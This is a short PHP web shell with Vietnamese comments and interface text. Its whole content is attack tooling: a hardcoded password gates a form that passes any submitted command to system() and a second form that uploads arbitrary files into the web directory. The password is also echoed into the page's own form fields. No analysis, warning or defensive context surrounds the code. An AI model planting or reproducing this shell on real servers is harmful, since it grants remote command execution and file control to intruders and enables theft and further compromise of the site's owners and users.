<?php
// Mật khẩu để bảo vệ shell
$password = "Deoxyz@111";

if (!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    exit("Access denied");
}

// Thực thi lệnh shell
if (isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
    exit;
}

// Upload file
if (isset($_FILES['upload'])) {
    $target = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "Upload thành công: $target";
    } else {
        echo "Upload thất bại";
    }
    exit;
}

// Hiển thị giao diện đơn giản
?>
<form method="POST" enctype="multipart/form-data">
    Mật khẩu: <input type="password" name="pass" value="<?php echo htmlspecialchars($password); ?>" /><br/>
    Lệnh shell: <input type="text" name="cmd" style="width: 300px;" />
    <input type="submit" value="Chạy lệnh" />
</form>

<form method="POST" enctype="multipart/form-data">
    Mật khẩu: <input type="password" name="pass" value="<?php echo htmlspecialchars($password); ?>" /><br/>
    Upload file: <input type="file" name="upload" />
    <input type="submit" value="Upload" />
</form>
